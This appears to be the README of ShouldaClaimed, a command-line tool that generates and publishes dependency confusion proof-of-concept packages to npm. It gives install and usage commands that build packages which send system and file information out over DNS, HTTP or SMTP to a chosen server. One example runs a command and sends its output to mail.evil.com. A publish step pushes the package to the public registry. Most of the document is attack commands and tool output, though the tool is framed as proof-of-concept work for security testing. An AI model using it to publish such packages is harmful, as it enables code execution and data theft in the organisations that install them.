# ShouldaClaimed

A CLI tool for generating and publishing Dependency Confusion Proof-of-Concepts (POCs) to NPM.

## Install

```bash
go install github.com/A3-N/ShouldaClaimed@latest
```

## Usage

### 1. Create Payload (No Publish)

Generate a package to inspect the code or publish manually later.

**Standard Exfiltration (System & File Info):**
```bash
# DNS (Chunked for reliability)
ShouldaClaimed create -t internal-utils -p dns -s your-collab.net

# HTTP
ShouldaClaimed create -t internal-utils -p http -s http://your-collab.net
```

**RCE with Exfiltration:**
Execute a command and send the output back via the selected protocol.

```bash
# Run 'whoami' and send output via SMTP
ShouldaClaimed create -t internal-utils -p smtp -s mail.evil.com:25 -r "whoami"
```

### 2. Create & Publish

Generates the package, handles authentication, and publishes to the NPM registry in one go.

```bash
ShouldaClaimed publish -t internal-utils -p dns -s your-collab.net
```

**Note:** This command verifies `npm` is installed, the package doesn't already exist in the registry (to avoid collision), and performs `npm login` if not authenticated.

## Example Output

```text
.▄▄ ·  ▄ .▄      ▄• ▄▌▄▄▌  ·▄▄▄▄   ▄▄▄· 
▐█ ▀. ██▪▐█▪     █▪██▌██•  ██▪ ██ ▐█ ▀█ 
▄▀▀▀█▄██▀▐█ ▄█▀▄ █▌▐█▌██▪  ▐█· ▐█▌▄█▀▀█ 
▐█▄▪▐███▌▐▀▐█▌.▐▌▐█▄█▌▐█▌▐▌██. ██ ▐█ ▪▐▌
 ▀▀▀▀ ▀▀▀ · ▀█▄▀▪ ▀▀▀ .▀▀▀ ▀▀▀▀▀•  ▀  ▀ 
 ▄▄· ▄▄▌   ▄▄▄· ▪  • ▌ ▄ ·. ▄▄▄ .·▄▄▄▄  
▐█ ▌▪██•  ▐█ ▀█ ██ ·██ ▐███▪▀▄.▀·██▪ ██ 
██ ▄▄██▪  ▄█▀▀█ ▐█·▐█ ▌▐▌▐█·▐▀▀▪▄▐█· ▐█▌
▐███▌▐█▌▐▌▐█ ▪▐▌▐█▌██ ██▌▐█▌▐█▄▄▌██. ██ 
·▀▀▀ .▀▀▀  ▀  ▀ ▀▀▀▀▀  █▪▀▀▀ ▀▀▀ ▀▀▀▀▀• 
			            github.com/A3-N
[INF] ShouldaClaimed CLI initialized
[INF] Ensuring NPM authentication...
[INF] Creating package structure in ./internal-utils
[SUC] Created payload: index.js
[SUC] Created package.json
[INF] Publishing package from ./internal-utils...
npm notice
npm notice 📦  internal-utils@1.0.0
npm notice === Tarball Details ===
npm notice name:          internal-utils
npm notice version:       1.0.0
npm notice filename:      internal-utils-1.0.0.tgz
npm notice package size:  1.2 kB
npm notice unpacked size: 2.5 kB
npm notice shasum:        ...
npm notice integrity:     ...
npm notice total files:   2
npm notice
+ internal-utils@1.0.0
[SUC] Package published successfully!
```

## Flags

| Flag | Long | Description |
|---|---|---|
| `-t` | `--target` | **Required.** Target package name. |
| `-p` | `--poc` | Protocol: `dns`, `http`, `smtp`. |
| `-s` | `--server` | Exfiltration server URI (e.g., `collab.net`, `http://...`). |
| `-r` | `--rce` | Command to execute. If set, output is exfiltrated via `-p`. |
| `-o` | `--out` | Output directory (default: `.`). |
| `-f` | `--force` | Skip pre-flight checks (NPM installed? Registry collision?). |
